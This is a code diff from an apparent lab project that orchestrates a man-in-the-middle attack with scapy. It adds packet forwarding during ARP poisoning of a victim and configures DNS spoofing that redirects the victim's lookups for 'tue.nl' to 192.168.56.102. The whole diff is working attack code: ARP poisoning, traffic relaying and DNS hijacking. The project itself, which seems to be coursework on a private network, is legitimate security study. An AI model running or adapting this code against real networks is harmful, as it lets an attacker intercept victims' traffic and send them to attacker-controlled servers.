@@ -2,6 +2,7 @@ from src import arp_spoof as arp
 from src import dns_spoof as dns
 from src import discover_active
 from src import discover_passive
+from src import forward as fwd
 from scapy.arch import get_if_list
 
 hosts = dict()
@@ -141,17 +142,20 @@ if __name__ == '__main__':
         delay=3
     )
     arp_spoofing.start()
-
-    input("Press [enter] to stop ARP spoofing")
-    arp_spoofing.stop()
+    forwarding = fwd.Forwarding(interface=arp_spoof_victim_if, hosts=hosts)
+    forwarding.start()
 
     input("Press [enter] to start DNS spoofing")
     dns_spoofing = dns.DNSSpoofing(
-        interface="enp0s3",
+        interface=arp_spoof_victim_if,
         domain_names=["tue.nl"],
-        victims=[],
-        redirect_ip=""
+        victims=[arp_spoof_victim_ip],
+        redirect_ip="192.168.56.102"
     )
     dns_spoofing.start()
     input("Press [enter] to stop DNS spoofing")
     dns_spoofing.stop()
+
+    input("Press [enter] to stop ARP spoofing")
+    arp_spoofing.stop()
+    forwarding.stop()
